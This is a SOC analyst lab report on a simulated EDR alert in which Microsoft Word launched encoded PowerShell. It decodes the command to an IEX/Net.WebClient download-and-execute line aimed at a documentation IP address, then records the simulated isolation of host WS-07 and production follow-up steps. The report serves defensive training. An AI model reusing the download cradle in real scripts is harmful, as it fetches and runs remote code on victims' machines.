# ALERT-1008 — Suspicious Encoded PowerShell Launched by Word

> **Lab:** Work Trainer — simulated SOC Analyst Trainer  
> **Severity in simulator:** High | **Level:** Intermediate  
> **MITRE ATT&CK:** [T1059.001 — PowerShell](https://attack.mitre.org/techniques/T1059/001/)  
> **Status:** Investigation and simulated host isolation completed; analyst reported writing a ticket. A final all-items checklist was not supplied.  
> **Scope:** Educational investigation, **not** a real incident.

## Investigation objective

An endpoint detection and response (EDR) alert identified PowerShell started with `-enc` and a Microsoft Word parent process. The investigation aimed to inspect the process relationship, decode the encoded command **without executing it**, identify any external destination, and contain the affected training endpoint.

## Evidence collected

The analyst read the simulated process log using:

```bash
cat /var/log/process.log
```

Relevant excerpt (the long encoded argument has been abbreviated for readability):

```text
11:02:10 WS-07 user=lee parent=winword.exe cmd=powershell -enc SUVYIChOZXctT2JqZWN0...
11:00:01 WS-07 user=lee parent=explorer.exe cmd=notepad.exe
```

| Field | Observation | Interpretation |
|---|---|---|
| Host | `WS-07` | Endpoint associated with the alert. |
| User | `lee` | Account context shown in the simulator. |
| Parent | `winword.exe` | Microsoft Word launched the suspicious child process. |
| Child command | `powershell -enc ...` | Encoded PowerShell was requested; the flag alone does not establish maliciousness. |
| Other recorded event | `explorer.exe` → `notepad.exe` | A separate entry, not shown to be connected to the suspicious process. |

The two records contain times but no date or timezone.

## Safe decoding and analysis

The analyst decoded the supplied Base64 value using a Linux `echo` pipeline with `base64 -d`. The decoded text was:

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.9/a.ps1')
```

**Behavior indicated by the command:**

1. `New-Object Net.WebClient` constructs a network-capable client.
2. `DownloadString(...)` attempts to retrieve the content at the URL as text.
3. `IEX` (alias for `Invoke-Expression`) evaluates the retrieved text as PowerShell commands.

The URL contains `198.51.100.9`, which belongs to a documentation-only address block in this **simulated** scenario. Do not treat it as an actionable production threat indicator.

**Important encoding nuance:** PowerShell's real `-EncodedCommand` convention expects a Base64-encoded **UTF-16LE** command. The training sample decodes into readable ASCII text directly with Linux `base64 -d`; this simplified exercise must not be treated as proof of the exact command-line encoding behavior of a real Windows endpoint.

The analyst decoded the text; **the decoded command was not run** as part of this Linux investigation.

## Findings and confidence

**Observed:**

- The simulator logged Word as the parent of an encoded PowerShell invocation.
- Decoding exposed a command intended to download and execute a remote PowerShell script.
- The target host was `WS-07`.

**Assessment:** Suspicious PowerShell execution pattern, classified as **True Positive** in the training incident ticket. The combination of Office spawning an encoded shell and a download-and-execute expression supports investigation and containment.

**Not established by the provided evidence:**

- Successful retrieval of `a.ps1` or successful execution of its contents.
- The actual content or effects of the remote script.
- The existence of a malicious Word macro or phishing origin.
- Credential theft, persistence, lateral movement, or data exfiltration.

## Response performed in the simulator

The analyst used the training-specific command:

```text
isolate WS-07
```

The analyst subsequently confirmed that the simulator's **Host isolated** checklist item was completed.

The analyst also reported submitting an incident ticket identifying a True Positive, `WS-07`, the Word → PowerShell relationship, the decoded destination, and isolation. The conversation did **not** include a final screenshot or checklist confirming all ticket criteria; therefore this report does not assert the entire alert checklist was completed.

## Recommended production follow-up (not performed in the lab)

- Validate endpoint isolation in the actual EDR system, retaining authorized management access.
- Correlate Windows process creation telemetry (e.g., Security 4688 and Sysmon 1, if collected) with command line, process ancestry and host context.
- Inspect relevant PowerShell logging (e.g., Script Block Logging where configured), network proxy/DNS records, and EDR telemetry for evidence of download and subsequent execution.
- Safely collect the suspicious document and script artifacts without executing them; determine how the execution chain started.
- Hunt for matching behaviors across other endpoints and maintain chain of custody for evidence.
- Document confirmed observations separately from unverified impact hypotheses.

## Lessons learned

- An unusual process relationship is useful context but not conclusive by itself.
- Base64 is an **encoding**, not encryption; decoding is analysis, not execution.
- A download-and-execute expression reveals **intent in the command**, not necessarily a successful network operation.
- Verify containment using endpoint state and telemetry rather than relying solely on a command being issued.

## References

- [MITRE ATT&CK T1059.001 — PowerShell](https://attack.mitre.org/techniques/T1059/001/)
- [Microsoft — about_PowerShell_exe](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_powershell_exe)
- [Microsoft — PowerShell Script Block Logging](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_logging_windows)
